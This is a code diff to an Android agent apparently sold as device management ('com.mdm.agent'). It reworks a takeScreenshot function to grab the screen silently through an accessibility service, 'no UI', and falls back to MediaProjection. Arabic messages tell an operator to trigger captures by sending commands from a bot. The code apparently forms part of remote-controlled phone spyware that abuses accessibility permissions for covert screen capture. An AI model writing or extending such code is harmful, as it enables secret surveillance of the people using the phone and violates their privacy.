@@ -460,41 +460,51 @@ class DataCollectors(private val context: Context) {
     fun takeScreenshot(): Any {
         Log.i(TAG, "📸 takeScreenshot called")
 
-        // ✅ Use AccessibilityService.takeScreenshot() (Android 11+)
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             return CollectedData.TextResult("⚠️ لقطات الشاشة تتطلب أندرويد 11 أو أحدث")
         }
 
-        // ✅ REMOVED pre-check: just try to take the screenshot directly.
-        // The pre-check was unreliable and returned false even when accessibility
-        // was enabled (e.g., after APK install, Android temporarily disables
-        // the service but the settings still show it as enabled).
-        //
-        // Now we just try takeScreenshotAccessibility() and if it fails, we get null.
-
-        return try {
+        // ✅ STEP 1: Try Accessibility-based screenshot first (silent, no UI)
+        var resultFile: File? = null
+        try {
             val latch = java.util.concurrent.CountDownLatch(1)
-            var resultFile: File? = null
-
             com.mdm.agent.service.MDMAccessibilityService.takeScreenshotAccessibility(context) { file ->
                 resultFile = file
                 latch.countDown()
             }
-
-            // Wait up to 10 seconds for the screenshot
             latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
-
             if (resultFile != null && resultFile!!.exists() && resultFile!!.length() > 100) {
-                Log.i(TAG, "✅ Screenshot captured: ${resultFile!!.absolutePath} (${resultFile!!.length()} bytes)")
-                CollectedData.FileResult(resultFile!!, "screenshot")
-            } else {
-                Log.e(TAG, "❌ Screenshot failed - resultFile=$resultFile")
-                CollectedData.TextResult("❌ فشل التقاط الصورة - تأكد من تفعيل إمكانية الوصول (Accessibility) ثم أعد المحاولة")
+                Log.i(TAG, "✅ Screenshot via Accessibility SUCCESS: ${resultFile!!.absolutePath}")
+                return CollectedData.FileResult(resultFile!!, "screenshot")
             }
+            Log.w(TAG, "⚠️ Accessibility screenshot failed, trying MediaProjection...")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ takeScreenshot exception: ${e.message}", e)
-            CollectedData.TextResult("❌ خطأ في لقطة الشاشة: ${e.message}")
+            Log.w(TAG, "⚠️ Accessibility screenshot exception: ${e.message}, trying MediaProjection...")
         }
+
+        // ✅ STEP 2: Fallback to MediaProjection (if Accessibility failed)
+        if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
+            try {
+                val latch = java.util.concurrent.CountDownLatch(1)
+                var mpFile: File? = null
+                com.mdm.agent.service.ScreenCaptureService.requestScreenshot(context) { file ->
+                    mpFile = file
+                    latch.countDown()
+                }
+                latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
+                if (mpFile != null && mpFile!!.exists() && mpFile!!.length() > 100) {
+                    Log.i(TAG, "✅ Screenshot via MediaProjection SUCCESS: ${mpFile!!.absolutePath}")
+                    return CollectedData.FileResult(mpFile!!, "screenshot")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ MediaProjection screenshot exception: ${e.message}")
+            }
+        }
+
+        // ✅ STEP 3: Both failed - return clear error
+        Log.e(TAG, "❌ Both Accessibility and MediaProjection failed")
+        return CollectedData.TextResult("❌ فشل التقاط الصورة - الطريقتان فشلتا\n\n" +
+            "الحل: من البوت أرسل 'screenshot-on' أولاً لتفعيل MediaProjection (سيظهر مربع موافقة على الهاتف)، ثم أرسل 'screenshot'")
     }
 
     // ════════════════════════════════════════════════════════════════
